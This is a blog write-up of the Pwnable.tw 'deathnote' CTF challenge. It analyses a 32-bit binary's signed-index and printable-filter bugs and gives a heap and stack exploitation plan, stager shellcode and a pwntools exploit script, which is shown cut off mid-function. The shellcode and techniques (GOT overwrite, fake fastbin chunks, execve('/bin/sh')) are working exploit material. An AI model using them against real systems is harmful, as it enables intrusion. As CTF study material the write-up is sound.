---
layout: post
title: "Pwnable.tw - deathnote"
date: 2025-01-24 19:59:45 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## deathnote

```bash
$ checksec death_note
[*] '/home/itay/projects/pwnable_tw/deathnote/death_note'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No

$ file ./death_note
./death_note: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=547f3a1cf19ffe5798d45def2f4bc5c585af88f5, not stripped
```

So 32-bit, no mitigations at all - **executable stack**, no libc provided (so probably no heap exploits involved)

## Overview

The fact that this binary is both 32 bit AND nearly no mitigations (as we can execute code from the stack / heap) makes it seem extremely easy. \
This is a menu-based challenge, having the options of `Add name, show name, delete name, exit`.

1. Interestingly, there's a global pointer within the `.bss`, called `__bss_start` - but it just located at the `.bss`'s start, not necessarily contains its value. In particular, it is being called as `setvbuf` parameter, which might hint us that it is actually a pointer to some file stream we would potentially like to mess with.

2. The above `__bss_start` is referenced from few cryptic functions (`register_tm_clones, deregister_tm_clones`). Most importantly, at the symbol table it seems to be just the `stdin` symbol, so it may be just some IDA-weird behavior (however, `stdout` isn't referenced from these cryptic functions):

```c
Elf32_Sym <offset aStdin - offset byte_80482D8, offset __bss_start, 4,\ ; "stdin"
LOAD:080482C8                            11h, 0, 1Ah>
LOAD:080482D8 ; ELF String Table
LOAD:080482D8 byte_80482D8    db 0                    ; DATA XREF: LOAD:080481E8↑o
```

3. The menu option is read via `read_int`. It contains a vuln, as the buffer the number is read into isn't initialized. This means that `atoi` may return a value, partially based on uninitiallized bytes - potentailly leaking information. However, since we don't receive the return value (simply `Invalid choice` is being printed), it cannot serve as an information disclosure. Still, we may store there interesting buffers that would get parsed properly, such as `atoi("1;/bin/sh\x00")`.

4. `add_note` - Reads an `int index` (up to `10` notes), and `name` string, eventually storing a copy of the `name` string into the notes array within the `.bss`. There are many suspicious notes (ba-doom-pst) within this function.

5. **Vuln: integer signess issue leads to OOB-write** - the comparision of the sent `index > 10` is a signed check. Hence, we can still send some very large number that would be interpreted as negative value. By doing so, the following would cause OOB-write of a heap pointer, towards any address prior to the `.bss notes` address:

```c
v1 = read_int();
  if ( v1 > 10 )
  {
    puts("Out of bound !!");
    exit(0);
  }
...
*(&note + v1) = strdup(s);
```

6. **Vuln: untruncated string** - the `name` buffer content is initialized via `read_input`, which doesn't truncates the buffer at all, nor initializes its value. This can serve as a leak primitive, by either leaking pre-existing bytes of the `name` buffer, or creating untruncated string, that would leak consequtive bytes:

```c
char s[80];
...
read_input(s, 0x50u);
if ( !is_printable(s) )
  {
    puts("It must be a printable name !");
    exit(-1);
  }
```

7. **Logical vuln: setting unprintable characters** - while there's a clear attempt to prevent non-printable characters from being set as the `name`, the `is_printable` loop is based solely on the `strlen` of the sent buffer. This means that if we'd send a buffer having `\x00` at the start of it, and non-printable characters after that null byte, we would pass the check while injecting non-printable characters.

8. **Sus usage of `strdup`** - notice the `name` string is simply used as a parameter to `strdup`, which is returned to the `notes` array. This returned string is allocated on the heap, and may contain uninitialized values past the terminating null byte.

9. `show_note` - reads an `int index`, and prints the name string via format string. Of course it can serve as a leak primitive:

```c
if ( result )
    return printf("Name : %s\n", (const char *)*(&note + v1));
```

10. Moreover, because of the integer signess vuln, we can supply negative index, reading arbitrary pointers prior to the `notes` array - as there's no mechanism that tracks if these notes are indeed allocated.

11. `del_note` - performs `free` on the desired note, and also sets it to `NULL`. Also suffers from the same integer signess vuln, hence can serve as nearly (for addresses prior to `notes` array) arbitrary free primitive. Notice that probably all of the chunks would fall into the tcache, as the string maximal size is `0x50` bytes (however, due to the un-truncated bug it may be larger).

## Exploitation

We have ALOT we can play with in here.

### TL;DR

The general idea is simple (things get bad real quick, don't worry):

1. Retrieve leaks

2. Use the local stack buffers of `read_int` as fake chunks

3. Free the fake chunk on the stack. This would be a legitimate address during `del_note`'s frame.

4. Perform allocation of the adequate size class. It would be made off the desired bin, hence returning the fake chunk, which is a stack address.

5. Write shellcode on the stack

6. Store the allocation result (stack address) to some GOT entry. Now program would jump to the stack shellcode and win.

However, there are many, many problems this solution has:

0. The read primitive can only take a negative offset to the `notes` array. Initially, I've thought this means we can only utilize the read primitive to read addresses below `notes` - meaning, program (`0x804AAAA`) addresses. However, we can use integer underflow to wrap-around the VA space, and by supplying extremely large negative number, obtain read target addresses such as `0xfffffff0`.

1. Obtaining a reliable stack address isn't trivial at all. Since the read primitive is actually a read-deref, we need a chain of 3 pointers to obtain a leak. For libc, we utilize the `.rel` section, which contains pointers to GOT entries (which contains pointers to libc). Hence, leaking libc reliably. From there, we leak libc's `environ`, which points towards `env[0]`. Howeever, leaking `env[0]` address isn't sufficient, as the remote environment variables differ, hence causing different offsets. Moreover, there's randomization of null bytes at the top of the stack, between `env[0]` and `envp` itself. My solution was to use the read-deref primitive in order to scan the stack top-down, until we reach certain signature we can assert that is close to main's frame. Notice the read primitive doesn't crashes upon an attempt of reading a `NULL` ptr, which is awesome. However, at 50% chance we can crash due to a non-pointer non-NULL data, resides as the first encountered element during scan. I've bypassed this by making the scan delta to be `0x20` bytes (as the randomization is done with granularity of `0x10` bytes). 

2. Also regarding the scan - due to large RTT to taiwan, I could only make ~80 requests until a timeout. Hence, I had to assume some initial offset to start scanning from, otherwise always timeout have occured. This hurts the statistics of success, as we may jump over the stack signature. 

3. Initially, I wanted to store my fake chunk within `add_note`'s local buffer, and free it within `del_note`. However, most of `add_note` local buffer's stack frame is polluted during the call of `del_note`. Hence, I had no other option but to use the stack buffers of `read_int` to store my fake chunk. However, because freeing small/large/unsorted chunk would trigger a consolidation attempt (hence, more checks to bypass), the only adequate size class to free were the fastbins, hence a chunk of maximal size of `0x40` bytes. Upon freeing a fastbin chunk, multiple checks are made. First, the heap must be initialized - otherwise `munmap` is issued on the desired chunk - and fails. Moreover, In addition to alignment constraints, the next fake chunk must have an adequate size- more than `2 * SIZEOF_PTR == 8` and less than `arena.system_mem == 0x21000`. Within the boundary of `0x40` bytes, there are no possible offsets that meets the fake chunk's criterias. I've bypassed this by writing a heap pointer (`strdup` result) as the new `arena.system_mem`, hence creating program addresses also viable as fake next chunk size candidates (as heap addresses always larger than `0x804AAAA`). There was only one such candidate, located at offset `0x18` bytes from my fake chunk.

4. The allocation - as mentioned, my goal was to allocate the fake chunk into some GOT entry, such as `strlen` or `puts`. However, notice that the fake chunk is deallocated during `del_note`, where it was some legitimate address within the frame. But during `add_note`, the fake chunk **overlaps with the return address and stack canary**. Because of `strdup`, since we'd have to supply at least 12 printable bytes (causing 13 bytes allocation) for triggering `fastbins[0x18]` allocation, it would always overwrite the first `2 * SIZEOF_PTR` within crap printable characters, destorying the canary. I couldn't overwrite using non-printable characters, as this write is performed by `strdup` itself, and I couldn't perform an allocation of small (or 0) size, as I couldn't forge a 8-byte fake chunk (due to lacking fake next chunk candidates). 

5. The only solution, was to overwrite `stack_chk_fail` GOT - obtaining a very funny way to redirect control flow into the stack.

6. As mentioned, upon corrupting the canary and detecting it during `add_note` teardown, we'd jump to the stack `strdup`'ed buffer. This buffer must be at most `0x13` printable bytes (`0x14` bytes total) to trigger `fastbins[0x18]` allocation. Hence, I've just used it as a stager to the real shellcode, which was placed using the `name` buffer of the last call. The stager isn't too fancy, but notice it must be polymorphic shellcode - as we'd like to write the bytes of a **backward jump**. Recall backward jumps always contains negative-interpreted offset, which is an unprintable byte. A cool note is that all jmps, such as `je == \x74`, are printable, except for `jmp == \xeb`. But anyways, all of their backward offsets doesn't passes the filter - so we must create the polymorphic shellcode. 

7. The idea of the polymorphic shellcode to write itself, which can only be done using a `push` operation (as it is the only memory-write operation that is printable). I've made few `popa, pop` operations to carefully set `esp` to my goal value within the shellcode. I've stored the desired opcodes within `eax`, and performed a single `sub` operation that let me write arbitrary bytes into `eax`. Then, I've issued `push eax`, having `esp` points right after the `push eax` instruction, writing the jmp stager insutrction as the preceding bytes. I've utilized the fact that due to `strlen` behavior, the verification is truncated upon finding a null byte, hence I could place the unconstrainted shellcode right after the jmp stager.


### Idea 1 - Heap Shellcode

My initial idea is very simple, and doesn't requires leakage, nor `show_note, del_note` handlers - but only one allocation. \
Using the OOB-Write primitive of `add_note`, overwrite the GOT entry of `exit / free / .fini_array[0]` with our `strdup`'ed name buffer. By doing so, code execution would be redirected into our chunk within the heap, but since the binary is non-NX - this is fine. From there, we would just need to write alphanumeric shellcode as the name (maximum of `0x50` bytes) and win. \
However, after playing abit with the binary I've realized that the non-NX only applies to the stack, not the heap. 
Hence, we'd probably like to store our shellcode somewhere on the stack.

SPOILER(itay from the future): this was the official intended solution, as the remote DOES have an executable heap! I've rant more about this in the conclusions. 

### Idea 2 - Stack Shellcode

As mentioned, we cannot place the shellcode within the heap. We can at the stack though. \
The best candidate for storing our shellcode is the stack name buffer. While there's a check that it only contains printable characters, recall that this buffer's bytes remain on the stack even after the function's frame is destructed:

```c
unsigned int add_note()
{
  int v1; // [esp+8h] [ebp-60h]
  char s[80]; // [esp+Ch] [ebp-5Ch] BYREF
  unsigned int v3; // [esp+5Ch] [ebp-Ch]
  ...
if ( !is_printable(s) )
  {
    puts("It must be a printable name !");
    exit(-1);
  }
}
```

Hence, we'd just start the shellcode with some crap null bytes (and also consider its first bytes would probably be corrupted due to other method call's frames). \
Eventually, we'd have to redirect code execution into this stack shellcode (somewhere in the middle of it). This means we need 2 other primitives: stack leakage, as well as some write primitive.

### Read Primitive

Pretty straightforward - using the `show_note` handler, along with the integer-signess vuln, we can leak arbitrary content relative to the `note` .bss address. \
Since we provide an arbitrary negative index, we can read all addresses from `[&notes, &notes-0x80000000]` - which means we can actually wrap around the VA space, reading high addresses (libc, stack).
Also notice that it actually performs a read of `*(addr)` of our wish - which means that it does a deref of the requested address, and reads from there.
Hence, a chain of 3 pointers is needed in order to perform a leak. \
We can easily leak heap and libc addresses, for example by reading the `.bss stdout` pointer (which derefs libc, hence would leak the file stream content itself), or reading `plt` entries, for example:

```c
.plt:08048470 ; ssize_t read(int fd, void *buf, size_t nbytes)
.plt:08048470 _read           proc near               ; CODE XREF: read_input+11↓p
.plt:08048470                                         ; read_int+1C↓p
.plt:08048470
.plt:08048470 fd              = dword ptr  4
.plt:08048470 buf             = dword ptr  8
.plt:08048470 nbytes          = dword ptr  0Ch
.plt:08048470
.plt:08048470                 jmp     ds:off_804A00C
.plt:08048470 _read           endp
.plt:08048470
```

The trick is that address `0x8048470 + 2` contains the raw address of `read` within the GOT. Hence, double-derefing this address would yield the glibc address of `read`. \
This means we can easily retrieve libc pointers. However, notice we weren't provided with any libc. While we can still research what exact libc version the remote uses, it probably means that intentended solution does not involves libc leakage. \
Because I was abit curious, a simple leakage of libc pointers have proven me that the remote's libc version corresponds to the "popular" `libc_32.so`, given in other challenges.
Hence, we can mimic the remote environment, but I'm not sure its the intended route. \
Anyways, we can take this approach further, and assuming we've leaked a libc pointer, use the "read-deref" primitive in order to leak other regions interesting pointers.
The challenge is of course finding a 3-pointers chain to perform the leak. \
Using `p2p`, pwndbg can find 2 adequate pointers that have 3 pointers deref chain:

```bash
libc_base: 0xeb130000

00:0000│  0xeb295a34 —▸ 0xfff7a8f8 —▸ 0xfff7a9b8 ◂— 3
00:0000│  0xeb295a3c —▸ 0xfff7a928 —▸ 0xeb13d618 ◂— add byte ptr [eax + 0x64], bh
00:0000│  0xeb295a44 —▸ 0xfff7a958 —▸ 0xeb1432e5 ◂— inc edi /* 'GLIBC_2.0' */
00:0000│  0xeb295a4c —▸ 0xfff7aa28 —▸ 0x8047278 ◂— 0x7b /* '{' */
00:0000│  0xeb295a54 —▸ 0xfff7aaf8 ◂— 1
00:0000│  0xeb295a5c —▸ 0xfff7ab28 ◂— 0x23 /* '#' */
00:0000│  0xeb295a64 —▸ 0xfff7ac18 ◂— 0
00:0000│  0xeb295a6c —▸ 0xfff7ac88 —▸ 0xfff7cdff ◂— 'USER=itay'
00:0000│  0xeb295a74 —▸ 0xfff7ad38 ◂— 0x3e8
00:0000│  0xeb295a7c —▸ 0xfff7ad78 ◂— 0x20 /* ' ' */
```

In the example, these are `0xeb295a34 (base + 0x165a34)` and `0xeb295a6c (base + 0x165a6c)` - which would allow us leaking a stack address. \
Notice, that the easiest (and most reliable) way to leak a stack pointer off libc, using a triple chain, is by reading `environ`. \
Since the remote runs on a docker container, it has only mimimal amount of environment variables, which differ from my local setup. 
We can verify this, as the last 3 nibbles of the stack leak are `0xf3e`, meaning the first environment variable is located very close to the stack's top. 
My idea is simple - starting from the leaked `environ` address, scan the stack backwards, until certain known constant / pointer to string is found. \
I've took this idea further, and scanned the stack all the way up to `argv` was found. 
By doing so, I've signed on the `main`'s stack frame reliably. 
One major caveat is that while we can use the read primitive for `NULL` ptr's without crash (as there's a check before accessing the `NULL` pointer),
for non-NULL non-pointer data, there's no such a check. \
This means that incase we'd encounter such `SIZEOF_PTR` bytes, we'd crash. 
I've bypassed this by jumping at deltas of `0x20` bytes, as the randomization have occured within multipliers of `0x10`. 
Hence, there was 50% for the scan to work locally. \
Another challenge with the scan approach was the large RTT, that only allows ~80 requests per session. \
Hence, I've started the scan from some certain random offset (`100 * delta`), which probably hurted the statistics even more. 

Other interesting approach, is to leak stack pointers using `ld`. \
Recall `ld` and `libc` are within some constant offset. Hence, we can use interesting pointers within `ld`, such as:

```bash
00:0000│  0xeced0caf —▸ 0xff86d700 ◂— '/itay/projects/pwnable_tw/deathnote'
00:0000│  0xeced6cf8 (_dl_argv) —▸ 0xff86c774 —▸ 0xff86d69d ◂— './death_note'
00:0000│  0xeced6d08 (_rtld_global_ro+8) —▸ 0xff86c8cb ◂— 'i686'
00:0000│  0xeced6d50 (_rtld_global_ro+80) —▸ 0xff86c7f4 ◂— 0x20 /* ' ' */
00:0000│  0xeced6f34 (__libc_stack_end) —▸ 0xff86c770 ◂— 1
00:0000│  0xeced78fc —▸ 0xff86c77c —▸ 0xff86d6aa ◂— 'SHELL=/bin/bash'
```

A particular interesting pointer is `_dl_argv`, which contains a triple-path of stack pointers. \
However, it doesn't gives us much, as this pointer resides right before `env[0]` pointer - 
but also requires finding the constant offset between `ld, libc` - which differs on the remote vs local. 

Hence, I've chose to leak stack content using the scan-approach.

### Write Primitive

Recall that we're having 2 interesting primitives(`target` is controlled):

1. Arbitrary write of `strdup` result, `target = strdup(s)`. 

2. Arbitrary free of deref address, `free(*target)`. 

My initial idea was to use the arbitrary write of `strdup` result chunk, to overwrite some interesting metadata pointer. \
A perfect candidate is to overwrite some libc arena's bin-head pointer, such that it would contain the value of the `strdup` result. 
By doing so, it would treat the content of the `strdup` chunk as the first chunk within that bin, which may contain fake metadata. 
For example, if we would overwrite `fastbin[0x50]` head to our `strdup` result, AND we would set the first `SIZEOF_PTR` bytes to our controlled address,
the second allocation we'd perform would land at our target address. \
However, notice that prior to performing the `stddup`, `add_note` performs an `is_printable` check on the chunk's content. 
This means we won't be able to write artibtrary data within the fake chunk, such as pointers. \
Also notice this approach haven't used the arbitrary free primitive at all. 

Another idea, is to utilize the fact that the stack is executable, which is a great hint that eventually we'd like to write shellcode into the stack. \
Recall we can use the local buffer of `add_note` as a great candidate for our shellcode. 
Assuming we're having a stack leak primitive (which we do, by reading libc's `environ`), we need to find a way to redirect the control flow into that stack address. \
The arbitrary free primitive is interesting, as it may allow us to insert arbitrary address as a fake chunk within a bin- we just have to forge a fake chunk properly. \
Hence, this address would later be returned by `strdup` to the arbitrary target address, potentially translating to arbitrary write primitive. \
By overwriting a GOT entry, we can easily obtain code redirection primitive. \
A great candidate as GOT overwrite is the `strlen` function, which only has a single call site, and occurs right after we've written arbitrary content to the local stack buffer (prior to the verification). \
This means we'd like to forge the fake chunk, having `size = 0x51` and `prev_size = 0` as the `add_note` local stack variable, and having the shellcode data as its content. \
However, notice that after populating a fake chunk with `b'A' * 0x50`, by the time `delete_note` handler is called, the stack looks as follows:

```bash
# Right after writing to 'add_note' buffer
pwndbg> x/40wx 0xffbe991c
0xffbe991c:     0x41414141      0x41414141      0x41414141      0x41414141
0xffbe992c:     0x41414141      0x41414141      0x41414141      0x41414141
0xffbe993c:     0x41414141      0x41414141      0x41414141      0x41414141
0xffbe994c:     0x41414141      0x41414141      0x41414141      0x41414141
0xffbe995c:     0x41414141      0x41414141      0x41414141      0x41414141
0xffbe996c:     0x2c977e00      0xf4e925a0      0x00000000      0xffbe9988

# Within 'del_note' context
pwndbg> x/40wx 0xffbe991c
0xffbe991c:     0xf4d0f060      0xffbe995c      0x00000000      0x0000000a
0xffbe992c:     0x0000000f      0xffbe995c      0xf4db61e3      0x00000000
0xffbe993c:     0x080486dd      0xffbe995c      0xffbe995c      0x0000000f
0xffbe994c:     0x00000000      0xf4e92000      0x00000002      0x00000003
0xffbe995c:     0x08040a33      0x08048be4      0x41414141      0x41414141
```

This means that only `2 * SIZEOF_PTR` bytes have survived the various stack frames constructions and destructions. \
Hence, this is still sufficient to create a fake chunk within the stack:

```bash
pwndbg> x/40wx 0xfff2216c
0xfff2216c:     0xe80a6060      0xfff221ac      0x00000000      0x0000000a
0xfff2217c:     0x0000000f      0xfff221ac      0xe814d1e3      0x00000000
0xfff2218c:     0x080486dd      0xfff221ac      0xfff221ac      0x0000000f
0xfff2219c:     0x00000000      0xe8229000      0x00000002      0x00000003
0xfff221ac:     0x08040a33      0x08048be4      0x00000000      0x00000051
```

As we can see, `0xfff221ac + 8` now behaves as a fake chunk - which can now be freed! 
Notice, that because this address isn't aligned to `2 * SIZEOF_PTR`, the free would fall within a sanity check, triggering an abort. \
If we'd try to bypass this, setting the target address to `0xfff221ac + 4` (which now passes the alignment check), and the preceding `SIZEOF_PTR` to `0x51`,
we'd fall within `"double free or corruption (out)"` check, which means that the fake next chunk seems to be beyond the top chunk's end. It makes sense, as we're trying to free a stack pointer. 
We can bypass this whole flow, by making sure the chunk's size would fall into the fastbins (which has maximal size of `0x40` for this glibc version). 
Still, we'd have to make sure that the fake next chunk have an adequate size. \
The fastbin next chunk size must pass the following sanity check:

1. `size > 2 * SIZEOF_PTR == 8`

2. `size < system_mem == heap_size == (initially) 0x21000`

Notice we can also use the `read_int` 16-byte stack buffer. \
Since `atoi` is being used, we may store there `3;\xde\xad\xbe\xef` - which would get parsed properly. 
Notice we'd like to use the `read_int` within `main`, that reads the handler's index. 

By using main's `read_int` stack buffer, which starts at `0xffdbb32c` as a fake chunk 
(the initial `"3;\x00\x00"` part gets overwritten with a RA), we can use the large fake next chunk's size, `0x08048a02`
located at `0xffdbb34c`. 

```bash
pwndbg> x/50wx $esp - 0x50
0xffdbb2e0:     0xffdbb30c      0xef2491e3      0x00000000      0x080486dd
0xffdbb2f0:     0xffdbb30c      0xffdbb30c      0x0000000f      0xef1be046
0xffdbb300:     0xef325d60      0x0000000f      0xfdf5c58d      0x3234332d
0xffdbb310:     0x35373432      0x43430035      0xef434343      0xcbee8700
0xffdbb320:     0x08048abb      0x0000000f      0xffdbb348      0x08048842
0xffdbb330:     0x00000000      0x00000019      0x41424242      0xfdf5c58d
0xffdbb340:     0xef3255a0      0x00000000      0xffdbb358      0x08048a02
0xffdbb350:     0xef3253dc      0xffdbb370      0x00000000      0xef18d637
```

However, we must pass both alignment check (done, as the fake next chunk starts at `0xffdbb348`), 
as well as the heap maximal memory check. While I can use the partial write primitive to overwrite `arena.system_mem`, 
the cleanest way would be simply allocating tons of tons of chunks, making the system memory to pass `0x8048a02`. \
But because we can only allocate small chunks, it would take too much time, passing the 1-minute limit of the remote server. 
Hence, I've simply used the arbitrary write primitive in order to overwrite `arena.system_mem`. 

By doing so, the following stack layout occurs:

```bash
pwndbg> x/20wx $esp - 0x10
0xffd3d750:     0x08048abb      0x0000000f      0xffd3d778      0x08048842
0xffd3d760:     0x00000000      0x00000019      0x41424242      0xfdf3d192
0xffd3d770:     0x08048bf2      0x00000000      0xffd3d788      0x08048a02
```

And because `0x08048a02 < any_heap_addr`, we pass the fastbin next chunk size check:

```bash
pwndbg> bins
fastbins
0x18: 0xffd3d760 ◂— 0
```

Now that we've freed a fake stack chunk into `fastbins[0x18]`, we shall perform allocation - 
in order to write the allocation result (stack address) into a target address! \
The target address to overwrite would be some GOT entry. I've thought about `strlen, puts` as decent candidates. \
However, in order to trigger an allocation of `0x18` chunk, we have to request at least `0xd <= n <= 0x14` printable characters. 
The problem is that by supplying these bytes, `strdup` writes them to the newly-allocated stack chunk, which overlaps with `add_note`'s stack canary.
This happens because we perform the free of the chunk at a legitimate flow of `del_note` stack frame, which completely differs from `add_note` stack frame. \
I've tried many approaches to bypass this, such as allocating a `MIN_SIZE = 8` chunk, inserting non-printable characters, yet all didn't worked. \
My solution was funny - overwrite `stack_chk_fail` GOT.
Now, upon corruption of the canary and exiting from `add_note`'s frame, code is redirected to the stack. 

### Branch Primitive

Recall the code that wer'e initially running must be printable, as it is generated within `strdup` write into the stack-chunk. \
I've implemented simple jmp stager shellcode, which only performs `jmp 0xAA` - backward jump operation. 
Notice that since it contains unprintable characters, I had to use polymorphic shellcode:

```bash
# Increment the stack by 0x20 for each call
popa
popa
popa
# Increment the stack by 4 for each call
pop eax
pop eax
pop eax
# eax now contains known, deterministic value.
# Set its two LSBs to arbitrary backward jmp
sub eax, 0x41416e58
# Now esp points 4 bytes past the end of the push instruction. 
# Pushing eax would write the 'jmp' instruction right after 'push'
push eax
```

I've utilized the `name` buffer to store my real shellcode at, 
and pointed the stager jmp shellcode to jump into my real shellcode by the end of it. \
Moreover, I had started the real shellcode with a `\x00` byte, in order to pass the `is_printable` check (which is truncated at the first occurance of `\x00`). \
By doing so, I could write unconstrained bytes at my real shellcode.

## Solution

```python
#!/usr/bin/python3

from pwn import *

HOST = 'chall.pwnable.tw'
PORT = 10201
context.arch='i386'
context.os = 'linux'
context.endian = 'little'
BINARY = './death_note'
LIBC = './libc_32.so.6'
LD = './ld-2.23.so'

GDB_SCRIPT = '''
b *0x80487d3
commands
   p "gonna strdup"
end

# b is_printable 
# commands
#     p "in printable"
# end

# b *0x80488cd
# commands
#     p "gonna read"
# end

# b *0x804863c
# commands 
#    p "gonna read buffer"
# end

# b *del_note+0x41
# commands
#     p "in del_note, gonna free.."
# end


c
'''

SHELLCODE = '''
.byte 0x00
START:
nop
nop
nop
nop
nop
mov ebx, {0}
xor ecx, ecx
xor edx, edx
push 0x0b
pop eax
int 0x80

BIN_SH:
.ascii "/bin/sh"
.byte 0x00

.rept 26
nop
.endr
jmp START
'''


def unsigned(n, bitness=32):
    if n < 0:
        n = n + 2**bitness
    return n

def pad(buf, alignment, delimiter=b'\x00'):
    if (len(buf) % alignment) == 0:
        return buf

    extra = (alignment - (len(buf) % alignment)) * delimiter
    return buf + extra

def splitted(buf, n):
    for i in range(0, len(buf), n):
        yield buf[i: i + n]

def chunkSize(alloc_size):
    assert(alloc_size >= 0)
    min_size = alloc_size + SIZEOF_PTR
    res = min_size % (2 * SIZEOF_PTR)
    pad = (2 * SIZEOF_PTR) - res if res else 0
    return min_size + pad

def chunkSizeNoFlags(chunk_size):
    if IS_32_BIT:
        result = (chunk_size >> 3) << 3
    else:
        result = (chunk_size >> 4) << 4
    return result 

def maxAllocSize(chunk_size):
    chunk_size = chunkSizeNoFlags(chunk_size)
    return chunk_size - SIZEOF_PTR

def minAllocSize(chunk_size):
    chunk_size = chunkSizeNoFlags(chunk_size)
    return chunk_size - 3 * SIZEOF_PTR + 1

def recvPointer(p):
    leak = p.recv(SIZEOF_PTR)
    assert(len(leak) == SIZEOF_PTR)
    leak = u32(leak)
    assert(leak > 0x10000)
    return leak

###### Constants ######
IS_DEBUG = False 
IS_REMOTE = False
IS_32_BIT = True
SIZEOF_PTR = 4 if IS_32_BIT else 8
NAME_SIZE = 0x50
READINT_BUF_SIZE = 0x10

###### Offsets ######

###### Addresses ######
binary = ELF(BINARY)
main_binary = binary.symbols['main']
puts_got = binary.got['puts']
puts_plt = binary.plt['puts']
atoi_got = binary.got['atoi']
atoi_plt = binary.plt['atoi']
stack_chk_fail_got = binary.got['__stack_chk_fail']

libc = ELF(LIBC)
bin_sh_libc = next(libc.search(b'/bin/sh'))
system_libc = libc.symbols['system']
puts_libc = libc.symbols['puts']
environ_libc = libc.symbols['environ']

ld = ELF(LD)
argv_ld = ld.symbols['_dl_argv']

# libc_rop = ROP(LIBC)
# pop_eax_ret = libc_rop.eax.address
# pop_ebx_ret = libc_rop.ebx.address
# pop_ecx_ret = libc_rop.ecx.address
# pop_edx_ret = libc_rop.edx.address
# leave_ret = libc_rop.find_gadget(['leave']).address
# int_80 = libc_rop.find_gadget(['int 0x80']).address

def add_note(p, index, name, to_flush=True):
    assert(len(name) == NAME_SIZE)
    p.sendline(b'1')
    p.recvuntil(b'Index :')
    p.sendline(str(index).encode())
    p.recvuntil(b'Name :')
    p.send(name)
    if to_flush:
        p.recvuntil(b'Your choice :')

def show_note(p, index):
    p.sendline(b'2')
    p.recvuntil(b'Index :')
    p.sendline(str(index).encode())
    extra = p.recvuntil(b'Name : ')
    log.debug(f'[show_note]\nEXTRA_START:{extra}\nEXTRA_END\n')

def get_addr_index(addr):
    '''
    Calculates the index that would yield target address 'addr'.
    Notice it also handles the case of very large addresses (stack, libc) via VA space wrap-around
    '''
    addr_index = int((addr - binary.symbols['note']) / 4) 
    if addr_index >= 10:
        addr_index -= int(2 ** 32 / 4)
    # Incase this fails, destination addr isn't adequate for read leakage 
    assert(addr_index < 10)
    return addr_index

def arbitrary_write_strdup_result(p, addr, data, to_flush=True):
    addr_index = get_addr_index(addr)
    add_note(p, addr_index, data, to_flush)

def arbitrary_read_deref(p, addr, count=SIZEOF_PTR):
    '''
    Basically, just: arbitrary_read(*addr)
    '''
    addr_index = get_addr_index(addr)
    show_note(p, addr_index)
    leak = p.recv(count)
    extra = p.recvuntil(b'Your choice :')
    log.debug(f'[arbitrary_read_deref]\nEXTRA_START:{extra}\nEXTRA_END\n')
    return leak

def are_pointers_to_null(p, addr, delta=0x20, batch=1):
    addr_index = get_addr_index(addr)
    command_buf = b'0' * (READINT_BUF_SIZE - 2) + b'2'
    buf = b''
    for i in range(batch):
        index_buf = str(addr_index - int(delta / 4) * i).encode()
        index_buf += b'\x00' * (READINT_BUF_SIZE - 1 - len(index_buf))
        buf += command_buf + index_buf
    buf += b'5'
    p.send(buf)
    extra = p.recvuntil(b'Invalid choice')
    if b'Name : ' in extra:
        splitted = extra.split(b'Your choice :')[1:-1]
        log.info(f'SPLITTED:{splitted}')
        for i, result in enumerate(splitted):
            if b'Name : ' in result:
                return addr - delta * i
    return 0

def leak_libc(p):
    '''
    Leaks a libc address by reading the '.relocation' section, 
    as it contains a pointer to the corresponding GOT entry.
    '''
    puts_rel = 0x804840c
    puts_libc_addr = u32(arbitrary_read_deref(p, puts_rel))
    libc_base = puts_libc_addr - puts_libc
    assert(libc_base & 0xfff == 0)
    return libc_base

def leak_stack(p, libc_base):
    '''
    Leaks stack address by derefing into the 'environ' libc variable, 
    and leaking the first environment variable address.
    In an irregular case where there are no environment variables at all this won't work, as environ points to NULL.
    '''
    environ_libc_addr = libc_base + environ_libc 
    stack_leak = u32(arbitrary_read_deref(p, environ_libc_addr))
    return stack_leak

def scan_stack(p, start):
    '''
    TODO(itay): explain more what's going on here
    Works at 50% chance locally.
    Either segfaults, or finds the first pointer to argv[0]
    '''
    delta = 0x20
    batch = 1
    # We have to pass the first 100 indices, as taiwan's RTT is too large. 
    addr = (start & 0xfffffff0) - delta * 100
    for i in range(400):
        not_null_ptr = are_pointers_to_null(p, addr, delta=delta, batch=batch)
        log.info(f'i: {i} addr: {hex(addr)} not_null_ptr: {hex(not_null_ptr)}')
        if not_null_ptr != 0:
            break
        addr -= delta * batch

    log.info(f'found non-null pointer: {hex(addr)}')
    if IS_REMOTE:
        i686_str_addr = addr 
    else:
        i686_str_addr = addr - 0x10
    leak = arbitrary_read_deref(p, i686_str_addr, 20)
    log.info(f'i686 addr LEAK:{leak}')
    # One of the bytes may be '\x00'.. 
    # Maybe we'd like to sign using another string.
    # Alternatively, we might have jumped over the i686 string
    assert(leak.endswith(b'i686'))

    envs_end_addr = i686_str_addr - 0xa0
    for i in range(100):
        addr = envs_end_addr - SIZEOF_PTR * i
        not_null_ptr = are_pointers_to_null(p, addr, delta=delta, batch=1)
        if not_null_ptr:
            leak = arbitrary_read_deref(p, addr, 12)
            log.info(f'addr: {hex(addr)} leak:{leak} index: {i}')
            if b'/death_' in leak:
                log.info(f'found argv: {hex(addr)}')
                break

    return addr 

def assert_reliable_argv_addr(p, argv_addr):
    invalid_choice_ptr_addr_offset = 0xc4
    leak = arbitrary_read_deref(p, argv_addr - invalid_choice_ptr_addr_offset, 14)
    log.info(f'argv_addr asserion LEAK:{leak}')
    assert(leak.startswith(b'Invalid choice'))

def overwrite_heap_system_mem(p, libc_base):
    buf = b'A' * NAME_SIZE
    system_mem_addr = libc_base + 0x1b0bcc 
    arbitrary_write_strdup_result(p, system_mem_addr, buf)

def pad_to_readint_buf(buf):
    return buf.ljust(READINT_BUF_SIZE - 1, b'C')

def free_fake_stack_alloc(p, alloc_addr, chunk_size):
    fake_alloc_addr_index = get_addr_index(alloc_addr)
    buf = b'3;\x00\x00'
    # Recall the delete handler fress a DEREF of an address.
    # Hence, we have to store the fake chunk pointer somewhere we know. 
    # We utilize fake_prev_size for this. It doesn't goes through any sanity check, in case PREV_INUSE is set. 
    # Hence, we can store the target address there. 
    buf += p32(alloc_addr)
    # fake_size
    # I've chose this offset, as the only adequate fake_next_chunk candidate resides 0x18 bytes past our fake chunk.
    buf += p32(chunk_size)
